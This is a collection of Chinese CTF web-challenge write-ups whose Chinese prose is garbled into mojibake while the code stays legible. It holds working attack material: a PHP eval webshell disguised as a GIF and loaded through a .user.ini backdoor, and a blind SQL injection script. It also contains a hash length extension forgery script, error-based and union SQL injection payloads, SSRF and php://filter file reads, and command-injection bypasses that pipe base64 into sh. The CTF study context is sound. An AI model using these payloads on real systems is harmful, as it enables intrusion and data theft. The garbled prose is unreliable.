2ã€auto_prepend_fileï¼šæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶åï¼Œä½†æ˜¯å¦‚æœåœ¨åŒ…å«ä¹‹å‰é‡åˆ°exit()å‡½æ•°ä¾¿ä¸ä¼šåŒ…å«ã€‚ å®ƒä»¬çš„ä½¿ç”¨æ–¹æ³•æ˜¯ç›´æ¥å†™åœ¨.user.iniä¸­å³å¯ï¼Œå¦‚ï¼š auto_append_file=01.gifauto_prepend_file=01.gif è‡³æ­¤ï¼Œæˆ‘ä»¬çš„è§£é¢˜æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼š 1ã€æ„é€ åŒ…å«GIF89açš„å›¾ç‰‡é©¬ 2ã€å›¾ç‰‡é©¬ç”¨&lt;script language='php'&gt;&lt;scirpt&gt;ç±»å‹çš„ä»£ç  3ã€æ„é€ .user.iniæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬è¦ä¸Šä¼ çš„å›¾ç‰‡é©¬åç§° 4ã€å…ˆä¼ å…¥.user.iniç„¶åä¸Šä¼ å›¾ç‰‡é©¬ 5ã€èšå‰‘è¿æ¥ï¼Œæ‹¿flag è§£é¢˜æ„é€ å›¾ç‰‡é©¬ï¼š GIF89a&lt;script language=\"php\"&gt;eval($_POST['x']);&lt;/script&gt; æ„é€ .user.iniæ–‡ä»¶ GIF89aauto_prepend_file=xxx.jpg //æ³¨æ„ï¼šè¯¥å¤„çš„åç§°è¦ä¸å›¾ç‰‡é©¬çš„åç§°ç›¸åŒ å°†æ„é€ å¥½çš„æ–‡ä»¶ä¾æ¬¡ä¸Šä¼ ï¼Œç„¶åæ‹¿åˆ°æ–‡ä»¶å‚¨å­˜çš„è·¯å¾„ï¼Œè¿™é‡Œéœ€è¦è¯´æ˜ï¼šå‰é¢è®²è¿‡äº†ï¼Œauto_append_fileå’Œauto_prepend_fileçš„ä½œç”¨æ˜¯åœ¨åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶ä¸­åŒ…å«æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶ï¼Œåœ¨å›æ˜¾ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼Œç›¸åŒæ–‡ä»¶å¤¹ä¸‹è¿˜åŒ…å«index.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆåˆ©ç”¨å®ƒä¾¿å¯ä»¥æ‹¿åˆ°shellã€‚èšå‰‘è¿æ¥æ‹¿flagç”¨èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•å³å¯æ‹¿åˆ°flagï¼šå…³äº.user.iniæ–‡ä»¶æ„æˆçš„phpåé—¨è¿˜å¯ä»¥å‚è€ƒï¼šhttps://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [CISCN 2019ååŒ—]HackWorldé¢˜ç›®åˆ†ææ‰“å¼€é“¾æ¥çœ‹åˆ°å¦‚ä¸‹çš„è¾“å…¥æ¡†ï¼šæç¤ºæˆ‘ä»¬flagåœ¨flagè¡¨ä¸­çš„flagå­—æ®µï¼Œä¸€ä¸ªSQLæ³¨å…¥é¢˜ï¼ŒæŠ“åŒ…å‘ç°è¾“å…¥æ¡†çš„å€¼ä¼šé€šè¿‡å‚æ•°idä»¥POSTçš„æ–¹å¼ä¸Šä¼ åˆ°æœåŠ¡ç«¯ã€‚æµ‹è¯•å¯¹è¾“å…¥çš„é™åˆ¶ï¼Œç»“æœå¦‚ä¸‹ï¼š id=1 Hello, glzjin wants a girlfriend.id=1' bool(false)id=1'+ç©ºæ ¼ SQL Injection Checked.id=1'# SQL Injection Checked. æˆ‘ä»¬å‘ç°ï¼Œå½“è¾“å…¥ä¸º1çš„æ—¶å€™å›æ˜¾Hello, glzjin wants a girlfriend.åº”è¯¥æ˜¯ä¸€ä¸ªæ­£ç¡®çš„å›æ˜¾ï¼Œä½†æ˜¯è¾“å…¥1'å›æ˜¾bool(false)ï¼Œå¹¶ä¸”å¯¹äºä¸æ³¨å…¥ç›¸å…³çš„å­—ç¬¦ä¼šå›æ˜¾SQL Injection Checked.ï¼Œå› æ­¤ï¼Œåˆ¤æ–­æ˜¯ä¸€ä¸ªå¸ƒå°”ç›²æ³¨ã€‚å½“è¾“å…¥çš„è¡¨è¾¾å¼ä¸º1çš„æ—¶å€™ï¼Œä¼šç»™å‡ºæ­£ç¡®çš„å›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡åœ¨è¾“å…¥æ¡†æ„é€ ç»“æœä¸º1å¹¶ä¸”é€å­—ç¬¦åœ°è¯»å–flagå­—æ®µå†…å®¹çš„è¯­å¥ä¾¿å¯ä»¥è¯»å‡ºflagã€‚ è§£é¢˜å¯ä»¥ç”¨ä¸‹é¢çš„å¸ƒå°”ç›²æ³¨è„šæœ¬æ‹¿flagï¼š import requestsimport timeurl = \"http://b9b3fd3f-2f40-4927-8d69-50ffc78f9a4a.node3.buuoj.cn/index.php\"payload = { \"id\" : \"\"}result = \"\"for i in range(1,100): l = 33 r =130 mid = (l+r)&gt;&gt;1 while(l&lt;r): payload[\"id\"] = \"0^\" + \"(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})\".format(i,mid) html = requests.post(url,data=payload) print(payload) if \"Hello\" in html.text: l = mid+1 else: r = mid mid = (l+r)&gt;&gt;1 if(chr(mid)==\" \"): break result = result + chr(mid) print(result)print(\"flag: \" ,result) [De1CTF 2019]SSRF Meé¢˜ç›®åˆ†æï¼šé¦–å…ˆæ‹¿åˆ°æºç ï¼Œæ˜¯Flaskå†™çš„ï¼š from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) æˆ‘ä»¬å‘ç°ï¼Œä»£ç ä¸­å®šä¹‰äº†ä¸€ä¸ªtaskç±»ï¼Œå…¶ä¸­ä¸»è¦åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼š__init__()ã€Exec()ã€checkSignã€‚__init__()ä¸­ä»¥ç”¨æˆ·çš„IPç”Ÿæˆä¸€ä¸ªæ²™ç®±ï¼š def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) Exec()å¯ä»¥æ‰§è¡Œä¸€äº›æ“ä½œï¼š def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒExec()å‡½æ•°å¯ä»¥æ‰§è¡Œscanæ“ä½œï¼Œå¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œæ‰«æå¹¶æŠŠç»“æœå­˜åœ¨result.txtä¸­ï¼›readæ“ä½œå¯ä»¥è¯»å–ressult.txtä¸­çš„å†…å®¹ã€‚åŒæ—¶paramåˆæ˜¯ç”¨æˆ·è¾“å…¥ï¼Œé‚£ä¹ˆé€šè¿‡åˆ©ç”¨paramå’Œä¸Šè¿°ä¸¤ä¸ªæ“ä½œï¼Œè¿›è¡ŒSSRFä»¥æ‹¿åˆ°flagã€‚ å¾€ä¸‹æˆ‘ä»¬çœ‹åˆ°ä¸‰ä¸ªè·¯ç”±ï¼š @app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read() /geneSignè·¯ç”±ï¼šè·å¾—paramå‚æ•°ï¼Œé€šè¿‡actionå’Œparamç”Ÿæˆç­¾åã€‚å¹¶ä¸”åœ¨æœåŠ¡ç«¯çš„ç­¾åæ˜¯é€šè¿‡action=&quot;scan&quot;ç”Ÿæˆçš„ï¼Œé‚£å°±é™åˆ¶äº†ç”¨æˆ·æ‰§è¡Œçš„æ–¹æ³•ã€‚/De1taè·¯ç”±ï¼šè·å–cookieä¸­çš„actionå’Œparamä»¥åŠç­¾åsignï¼Œå¦‚æœparamåˆæ³•åˆ™ç”Ÿæˆtaskå¯¹è±¡ï¼Œå¹¶è¿”å›æ‰§è¡Œçš„å†…å®¹ã€‚/è·¯ç”±ï¼šè¯»å–ä»£ç ã€‚ è§£é¢˜æ€è·¯æˆ‘ä»¬ä»å‰é¢çŸ¥é“ï¼ŒæœåŠ¡ç«¯çš„ç­¾åå·²ç»é™åˆ¶ä¸ºaction=&quot;scan&quot;äº†ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ–¹æ³•æœ‰readé‚£ç­¾åå€¼å°†ä¼šä¸åŒï¼Œå°†ä¸èƒ½å®ç°è¯»å–ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ç»•è¿‡signçš„é™åˆ¶ã€‚æˆ‘ä»¬å¯ä»¥å‘ç°getSignå…¶å®æ˜¯æœ‰æ¼æ´çš„ï¼š def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() å³å½“æˆ‘ä»¬è¾“å…¥param=flag.txtreadçš„æ—¶å€™ï¼Œé‚£signå€¼å°±æ˜¯åŒ…å«readå’Œscançš„äº†ï¼Œä¹Ÿå°±å¯ä»¥å®ç°å¯¹æ–‡ä»¶çš„è¯»å–äº†ã€‚ è§£é¢˜è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯åˆ©ç”¨SSRFï¼Œä¹Ÿæ˜¯æœ¬é¢˜çš„è€ƒç‚¹ï¼Œç¬¬äºŒç§æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œçœ‹åˆ«çš„å¤§ä½¬çš„æ€è·¯æ‰çŸ¥é“çš„ã€‚ SSRFé¦–å…ˆæˆ‘ä»¬åœ¨/geneSignè·¯ç”±ä¸­åˆ©ç”¨param=flag.txtreadç”Ÿæˆä¸€ä¸ªç­¾åï¼šç„¶åé€šè¿‡/De1taè·¯ç”±ç”ŸæˆæœåŠ¡ç«¯çš„ç­¾åï¼Œéœ€è¦åˆ©ç”¨BPæŠ“åŒ…æ”¹åŒ…ï¼šè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨/De1taè·¯ç”±æ˜¯é€šè¿‡GETæ–¹å¼ä¼ paramçš„ï¼Œä½†æ˜¯Cookieéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨åŠ å…¥ï¼Œä»ä¸‹é¢è¿™æ®µä»£ç å¯çŸ¥ï¼šæˆ‘ä»¬éœ€è¦åœ¨cookieä¸­å†™å…¥actionå’Œsignå€¼ def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ä»è€Œå®ç°é€šè¿‡æ„é€ signç»•è¿‡é™åˆ¶å®ç°SSRFè¯»å–æœåŠ¡å™¨èµ„æºï¼Œæ‹¿åˆ°flagã€‚ Hashé•¿åº¦æ‰©å±•æ”»å‡»å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»(hash length extension attacks)æ˜¯æŒ‡é’ˆå¯¹æŸäº›å…è®¸åŒ…å«é¢å¤–ä¿¡æ¯çš„åŠ å¯†æ•£åˆ—å‡½æ•°çš„æ”»å‡»æ‰‹æ®µã€‚è¯¥æ”»å‡»é€‚ç”¨äºåœ¨æ¶ˆæ¯ä¸å¯†é’¥çš„é•¿åº¦å·²çŸ¥çš„æƒ…å½¢ä¸‹ï¼Œæ‰€æœ‰é‡‡å–äº†H(å¯†é’¥ âˆ¥ æ¶ˆæ¯)æ­¤ç±»æ„é€ çš„æ•£åˆ—å‡½æ•°ã€‚MD5å’ŒSHA-1ç­‰åŸºäºMerkleâ€“DamgÃ¥rdæ„é€ çš„ç®—æ³•å‡å¯¹æ­¤ç±»æ”»å‡»æ˜¾ç¤ºå‡ºè„†å¼±æ€§ã€‚ä¸€èˆ¬æ»¡è¶³ä¸‹é¢æ¡ä»¶çš„æƒ…å½¢å¯ä»¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼š 1ã€å‡†å¤‡äº†ä¸€ä¸ªå¯†æ–‡å’Œä¸€äº›æ•°æ®æ„é€ æˆä¸€ä¸ªå­—ç¬¦ä¸²é‡Œï¼Œå¹¶ä¸”ä½¿ç”¨äº†MD5ä¹‹ç±»çš„å“ˆå¸Œå‡½æ•°ç”Ÿæˆäº†ä¸€ä¸ªå“ˆå¸Œå€¼ï¼ˆä¹Ÿå°±æ˜¯æ‰€è°“çš„signature/ç­¾åï¼‰ï¼› 2ã€è®©æ”»å‡»è€…å¯ä»¥æäº¤æ•°æ®ä»¥åŠå“ˆå¸Œå€¼ï¼Œè™½ç„¶æ”»å‡»è€…ä¸çŸ¥é“å¯†æ–‡ï¼› 3ã€æœåŠ¡å™¨æŠŠæäº¤çš„æ•°æ®è·Ÿå¯†æ–‡æ„é€ æˆå­—ç¬¦ä¸²ï¼Œå¹¶ç»è¿‡å“ˆå¸Œååˆ¤æ–­æ˜¯å¦ç­‰åŒäºæäº¤ä¸Šæ¥çš„å“ˆå¸Œå€¼ è¯¦ç»†å¯å‚è€ƒï¼šhttps://www.freebuf.com/articles/web/69264.htmlè¯¥é¢˜ä¸­ï¼Œsignçš„è®¡ç®—ï¼š hashlib.md5(secert_key + param + action).hexdigest() æ˜¾ç„¶æ»¡è¶³è¿™ç§æƒ…å†µï¼Œå› æ­¤å¯ä»¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‚è„šæœ¬å¦‚ä¸‹ï¼š import hashpumpyimport requestsimport urllib.parsetxt1 = 'flag.txt'r = requests.get('http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/geneSign', params={'param': txt1})sign = r.texthash_sign = hashpumpy.hashpump(sign, txt1 + 'scan', 'read', 16)r = requests.get('http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/De1ta', params={'param': txt1}, cookies={ 'sign': hash_sign[0], 'action': urllib.parse.quote(hash_sign[1][len(txt1):])})print(r.text) [ç½‘é¼æ¯ 2018]Fakebooké¢˜ç›®åˆ†æè¿›å…¥é“¾æ¥ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥æ³¨å†Œå’Œç™»å½•çš„é¡µé¢ï¼Œè¿™é‡Œçš„æ³¨å†Œé¡µé¢æ˜¯ä»¥POSTä¸Šä¼ æ•°æ®çš„ï¼Œåˆ©ç”¨sqlmapæµ‹è¯•å‘ç°æœ‰POSTæ³¨å…¥ï¼Œå…·ä½“æ–¹æ³•æ˜¯ï¼š 1ã€æ³¨å†Œç”¨æˆ·æ—¶ç”¨BPæŠ“åŒ…ï¼Œä¿å­˜POSTè¡¨å•çš„æ•°æ®åˆ°æ–‡ä»¶; 2ã€ç„¶ååˆ©ç”¨sqlmapçˆ†åº“ï¼š python sqlmap.py -r \"the path of the catched file\" --dump --dbs ç»“æœå¦‚ä¸‹ï¼šè¿™ä¸ªæˆªå›¾ä¸­æ²¡æœ‰ä½“ç°å‡ºå®Œæ•´çš„æ•°æ®åº“ä¿¡æ¯ï¼Œå®Œæ•´çš„åºåˆ—åŒ–å†…å®¹ä¸­åŒ…å«çš„è¿˜æœ‰blogçš„åœ°å€ï¼Œä¸‹é¢çš„payloadä¸­å¯ä»¥çœ‹åˆ°ã€‚ ç»è¿‡æµ‹è¯•ï¼Œåœ¨wiew.phpè·¯å¾„ä¸‹å­˜åœ¨GETæ³¨å…¥ï¼Œè¿™é‡Œå­˜åœ¨æŠ¥é”™æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨extractvalue()å’Œupdatexml()è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æˆ‘åœ¨ç”¨extractvalue()è¿›è¡Œæµ‹è¯•æ—¶å¤±è´¥äº†ï¼Œç”¨updatexml()å¯ä»¥æˆåŠŸæ³¨å…¥ã€‚åˆ©ç”¨extractvalue()çš„æŠ¥é”™æ³¨å…¥å¯å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« RootersCTF-Babyweb-WriteUpã€‚æŠ¥é”™æ³¨å…¥å¯å‚è€ƒï¼šhttps://blog.csdn.net/zpy1998zpy/article/details/80631036 è¿›è¡ŒGETæ³¨å…¥åˆ©ç”¨å¸¸è§„çš„æ‰‹æ³¨æ–¹æ³•ï¼Œç»“åˆupdatexml()ä»¥å®ç°æŠ¥é”™æ³¨å…¥ï¼š 1ã€çˆ†åº“å /view.php?no=1 and updatexml(1,make_set(3,'~',(select database())),1)# 2ã€çˆ†è¡¨å /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)# 3ã€çˆ†åˆ—å /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1)# 4ã€çˆ†å­—æ®µ /view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)# æˆ‘ä»¬çœ‹åˆ°ï¼Œæœ€åçˆ†å‡ºçš„å­—æ®µçŸ¥åŒ…å«äº†ä¸€ä¸²åºåˆ—åŒ–çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥æ ¹æ®POSTæ³¨å…¥çš„ç»“æœå‘ç°ï¼Œè€Œå¹¶æ²¡æœ‰æ‹¿åˆ°flagã€‚è¿™é‡Œè¦æ³¨æ„ï¼Œunion selectè”åˆæŸ¥è¯¢ä¼šè¢«æ£€æµ‹å‡ºï¼Œå› æ­¤ç”¨\\**\\æ¥ç»•è¿‡ã€‚å‚è€ƒç½‘ä¸Šçš„WPå‘ç°ï¼Œè¯¥é¢˜å¹¶éåªè€ƒå¯Ÿæ³¨å…¥ï¼Œè¿˜è€ƒå¯Ÿäº†SSRFã€ååºåˆ—åŒ–æ„é€ fileæ–‡ä»¶åè®®ã€‚ åˆ©ç”¨Fileåè®®è¿›è¡ŒSSRFè¯»å–flagæ–‡ä»¶å¾¡å‰‘æ‰«æå‘ç°robots.txtå’Œflag.phpæ–‡ä»¶ï¼Œå¹¶ä¸”æ ¹æ®å‰é¢æŠ¥é”™æ³¨å…¥çš„è¿”å›é¡µé¢å¯è§ï¼Œflag.phpæ–‡ä»¶æ˜¯å­˜åœ¨/var/www/html/ä¸‹çš„ã€‚åŒæ—¶åœ¨robots.txtä¸­å‘ç°äº†å¤‡ä»½æ–‡ä»¶/user.php.bakï¼Œå…¶æºç å¦‚ä¸‹ï¼š &lt;?phpclass UserInfo{ public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); }} å¯ä»¥å‘ç°get()å‡½æ•°æ€»ä¼ å‚æ˜¯ä¸€ä¸ªurlï¼Œå› æ­¤çŒœæµ‹å­˜åœ¨SSRFï¼Œå‰é¢æˆ‘ä»¬ä¹ŸçŸ¥é“äº†å¯ä»¥åˆ©ç”¨file://åè®®æ¥è¯»å–flagæ–‡ä»¶ï¼Œå¯ä»¥æ„é€ file:///var/www/html/flag.phpè¯­å¥å¹¶å°†å…¶ä½œä¸ºç”¨æˆ·çš„blogåœ°å€å†™å…¥ï¼Œæœ€ååˆ©ç”¨è”åˆæŸ¥è¯¢å’Œååºåˆ—åŒ–å°†è¯¥è¯­å¥å†™å…¥åˆ°æ•°æ®åº“ï¼Œpayloadå¦‚ä¸‹ï¼š /view.php?no=0/**/union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"1\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' æ•ˆæœå¦‚ä¸‹ï¼šæ­¤æ—¶ï¼Œæˆ‘ä»¬å†™å…¥çš„å¯ä»¥è¯»å–æ–‡ä»¶çš„blogåœ°å€å·²ç»å¥æ•ˆï¼ŒæŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°ä¸€ä¸²base64çš„ç¼–ç ï¼Œè§£ç å³ä¸ºè¯»å–çš„flag.phpçš„å†…å®¹ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefunç›®æµ‹æ˜¯ç­¾åˆ°é¢˜ï¼Œæºç ä¸­æç¤ºï¼š $cat=$_GET['cat'];echo $cat;if($cat=='dog'){ echo 'Syc{cat_cat_cat_cat}';} ç®€å•ï¼Œ?cat=dogå³å¯ [RoarCTF 2019]EasyJavaè€ƒå¯Ÿweb.xmlçš„æ³„éœ²ï¼ŒJavawebæ²¡å­¦è¿‡â€¦ä¸è¿‡è¿™ä¸ªé¢˜ç›®å­¦åˆ°äº†ä¸€ç‚¹ï¼šç±»ä¼¼äºé¢˜ç›®ç»™çš„Helpæ–‡ä»¶ä¸‹è½½å¤±è´¥çš„æ—¶å€™å¯ä»¥å°è¯•æ”¹å˜è¯·æ±‚æ–¹å¼å»ä¸‹è½½ã€‚é™„ä¸Šä¸€äº›æœ‰å…³æºç æ³„éœ²çš„ç½‘ç«™ï¼šhttps://blog.csdn.net/wy_97/article/details/78165051 [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret Fileè¿›å»é¢˜ç›®ä¹‹åçœ‹æºç ï¼Œå‘ç°Archive_room.phpæ–‡ä»¶ï¼Œç‚¹è¿›å»ä¹‹åç»™äº†ä¸€ä¸ªæŒ‰é’®ï¼Œè¿™ä¸ªæŒ‰é’®å­˜åœ¨302è·³è½¬ï¼Œå› æ­¤éœ€è¦BPæŠ“åŒ…ã€‚æŠ“åŒ…å‘ç°ï¼Œç‚¹å‡»æ—¶å€™å…ˆè®¿é—®çš„æ˜¯action.phpï¼Œåœ¨æ”¹æ–‡ä»¶ä¸­çœ‹åˆ°äº†æç¤ºçš„secr3t.phpæ–‡ä»¶ï¼Œå†æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ç»™äº†æºç ï¼š &lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){ echo \"Oh no!\"; exit(); } include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt; å®¹æ˜“çœ‹å‡ºæ˜¯æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨phpä¼ªåè®®è¯»å–å³å¯ï¼š ?file=php://filter/convert.base64-encode/resource=flag.php [GXYCTF 2019]Ping Ping Pingæ ¹æ®é¢˜ç›®æç¤ºå’Œå‚æ•°ipå¯çŸ¥ï¼Œä¸å‘½ä»¤æ‰§è¡Œç›¸å…³ç¬¬ä¸€æ­¥ï¼Œåˆ©ç”¨|å¯ä»¥æ‰§è¡Œlså‘½ä»¤ï¼Œè¯»å–å†…å®¹ï¼š ?ip=127.0.0.1|ls å‘ç°å­˜åœ¨flag.phpå’Œindex.phpæ–‡ä»¶ï¼Œä½†æ˜¯ç›´æ¥åˆ©ç”¨cat flag.phpå»è¯»å–å‘ç°ç©ºæ ¼è¢«banï¼Œæ­¤å¤„è€ƒå¯Ÿäº†ç»•è¿‡ç©ºæ ¼è¢«bançš„æ–¹æ³•ï¼ˆä¸linuxç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œç›¸å…³ï¼‰ï¼š $IFS${IFS}$IFS$1 //$1ä¸­çš„æ•°å­—å¯ä»¥æ›´æ”¹&lt;&lt;&gt;{cat,flag.php}%20%09 é€šè¿‡å°è¯•å‘ç°$IFS$1å¯ä»¥ç»•è¿‡ç©ºæ ¼æ­¤æ—¶åˆæç¤ºflagè¢«banï¼Œç»•è¿‡çš„æ–¹æ³•ä¹Ÿæ¯”è¾ƒå¤šæ ·ï¼š å˜é‡æ‹¼æ¥ï¼šip=1;a=g;cat$IFS$1fla$a.phpå†…è”æ‰§è¡Œï¼šip=1;cat$IFS$1`ls` //æ³¨æ„è¿™é‡Œæ˜¯åå•å¼•å·ï¼Œå‘½ä»¤ä¼šå°†åå¼•å·ä¸­çš„è¾“å‡ºä½œä¸ºè¾“å…¥è¿›è¡Œæ‰§è¡Œåˆ©ç”¨sh/bashï¼š ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh åˆ©ç”¨å†…è”æ‰§è¡Œæ–¹æ³•ç»•è¿‡ï¼Œéœ€è¦åˆ°æ§åˆ¶å°çš„sourcesä¸‹æŸ¥çœ‹å†…å®¹ï¼Œå¦‚å›¾ï¼š [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPä¸€é“PHPååºåˆ—åŒ–é¢˜ç›®ï¼Œä¸»è¦è€ƒå¯Ÿäº†privateå®šä¹‰å­—æ®µçš„ç»•è¿‡æ–¹æ³•ã€‚ é¢˜ç›®åˆ†ææç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ï¼Œæ‰«åå°å¯ä»¥å¾—çŸ¥æ˜¯www.zipï¼Œä¸‹è½½æ–‡ä»¶ã€å®¡è®¡æºç ï¼Œåœ¨class.phpä¸­å‘ç°äº†ååºåˆ—åŒ–çš„ä»£ç ï¼š &lt;?phpinclude 'flag.php';error_reporting(0);class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"; echo \"You name is: \"; echo $this-&gt;username;echo \"&lt;/br&gt;\"; echo \"You password is: \"; echo $this-&gt;password;echo \"&lt;/br&gt;\"; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"; die(); } }}?&gt; æ ¹æ®ä»£ç é€»è¾‘å¯çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡wakeup()å‡½æ•°ï¼Œè¿™ä¸ªå¾ˆç®€å•ï¼Œæ›´æ”¹åºåˆ—åŒ–ä¹‹åç±»çš„å±æ€§ä¸ªæ•°å³å¯ã€‚ 